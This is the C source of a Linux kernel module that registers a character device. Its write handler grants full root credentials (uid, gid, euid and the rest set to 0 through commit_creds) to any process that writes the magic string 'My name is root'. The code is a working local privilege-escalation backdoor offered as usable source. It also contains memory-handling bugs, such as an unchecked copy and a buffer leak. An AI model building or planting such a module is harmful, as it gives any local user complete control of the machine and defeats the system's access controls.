#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/cdev.h>
#include <linux/cred.h>
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/syscalls.h>
#include <linux/types.h>
#include <linux/uaccess.h>
#include <linux/version.h>
#include "file-operations.h"

#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 4, 0)
#define V(x) x.val
#else
#define V(x) x
#endif

int dev_open(struct inode *inodep, struct file *filep) {
  printk(KERN_INFO "Device opened\n");
  return 0;
}

ssize_t dev_write(struct file *filep,
                  const char __user *buf,
                  size_t             len,
                  loff_t *           offset) {
  char *       data;
  char         magic[] = "My name is root";
  struct cred *new_cred;

  data = (char *)kmalloc(len + 1, GFP_KERNEL);
  if (data) {
    copy_from_user(data, buf, len);
    if (memcmp(data, magic, 15) == 0) {
      if ((new_cred = prepare_creds()) == NULL) {
        printk("TEST: Cannot prepare credentials\n");
        return 0;
      }

      printk("TEST: Credentials prepared!");
      V(new_cred->uid) = V(new_cred->gid) = 0;
      V(new_cred->euid) = V(new_cred->egid) = 0;
      V(new_cred->suid) = V(new_cred->sgid) = 0;
      V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
      commit_creds(new_cred);
    }
    kfree(data);
  }
  return len;
}

int dev_release(struct inode *inodep, struct file *filep) {
  printk(KERN_INFO "Device closed\n");
  return 0;
}

ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset) {
  int   errors      = 0;
  char *message     = "Oh yeah, read my device...";
  int   message_len = strlen(message);

  errors = copy_to_user(buffer, message, message_len);

  return errors == 0 ? message_len : -EFAULT;
}
